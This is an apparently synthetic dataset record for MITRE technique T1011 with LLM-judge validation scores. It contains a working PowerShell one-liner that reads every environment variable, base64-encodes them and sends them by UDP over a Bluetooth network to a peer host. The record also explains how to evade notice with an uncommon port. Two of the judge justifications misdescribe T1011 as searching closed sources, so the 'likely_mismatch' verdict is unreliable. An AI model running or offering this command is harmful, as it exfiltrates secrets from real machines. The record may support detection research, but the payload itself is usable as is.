{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.31.200.2 255.255.255.252 | Out-Null; $msg=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Out-String))); $u=New-Object Net.Sockets.UdpClient; $u.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.31.200.2'),0)); $dat=[Text.Encoding]::UTF8.GetBytes($msg); $u.Send($dat,$dat.Length,'172.31.200.1',53209) | Out-Null; $u.Close()",
  "explanation": "Sends base64-encoded environment data via UDP over a Bluetooth-only subnet, ensuring all traffic uses the alternate Bluetooth medium (T1011).",
  "rationale_steps": [
    "Connect to Bluetooth NAP to establish the alternate network medium.",
    "Set a restricted IP on the Bluetooth adapter via netsh.",
    "Bind UDP socket to the Bluetooth IP to force medium use.",
    "Transmit to a high, uncommon UDP port to minimize attention."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-1316e4be",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax for variable assignment, pipeline operations, and method calls.",
        "semantic_score": 1,
        "semantic_justification": "The command establishes a Bluetooth connection and exfiltrates environment data over UDP, but this represents exfiltration over alternative protocol (T1048) rather than searching closed sources (T1011) as claimed.",
        "combined_score": 3.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T12:18:58.153815Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, with correct Powershell and netsh syntax, balanced constructs, and proper use of operators and object instantiation.",
        "semantic_score": 0,
        "semantic_justification": "The command performs reconnaissance by collecting local environment variables and then exfiltrates them via UDP over Bluetooth, which is an exfiltration technique (e.g., T1048), not 'Search Closed Sources' (T1011) as claimed, which refers to acquiring intelligence from external, non-public data sources.",
        "combined_score": 2.5,
        "confidence": 1,
        "timestamp": "2025-10-02T12:19:13.176836Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quotes/parentheses, valid operators, and correctly invoked external commands and methods.",
        "semantic_score": 4,
        "semantic_justification": "It connects to a Bluetooth PAN, sets a static IP, binds a UDP client to that interface, and sends base64-encoded environment data to a peer (consistent with T1011), but the static IP change via netsh typically requires administrative privileges.",
        "combined_score": 4.5,
        "confidence": 0.8,
        "timestamp": "2025-10-02T12:20:04.167747Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 1.667,
    "llm_average_score": 3.333,
    "llm_verdict": "likely_mismatch",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}